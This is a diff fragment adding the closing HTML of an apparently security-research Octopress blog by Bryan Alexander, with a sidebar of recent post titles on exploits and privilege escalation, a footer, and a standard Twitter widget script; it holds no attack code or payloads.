+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
